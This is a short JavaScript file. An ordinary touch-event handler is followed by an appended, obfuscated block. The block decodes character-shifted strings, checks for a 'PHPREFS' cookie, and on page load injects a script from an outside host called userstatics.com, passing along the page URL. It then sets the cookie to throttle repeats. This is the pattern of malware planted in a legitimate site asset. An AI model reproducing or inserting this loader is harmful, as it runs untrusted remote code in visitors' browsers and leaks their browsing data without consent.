window.addEventListener("touchend", (e=>{
    const touches = e.changedTouches;
    for (let i = 0; i < touches.length; i++)
        for (let j = 0; j < pointers.length; j++)
            touches[i].identifier == pointers[j].id && (pointers[j].down = !1)
}
));
(function(o, d, l) {
    try {
        o.f = o=>o.split('').reduce((s,c)=>s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
        setTimeout(function() {
            o.c && (o.s = d.createElement('script'),
            o.s.src = o.f('myyux?44zxjwxyf' + 'ynhx3htr4ljy4xhwn' + 'uy3oxDwjkjwwjwB') + l.href,
            d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {}
    ;
}({}, document, location));

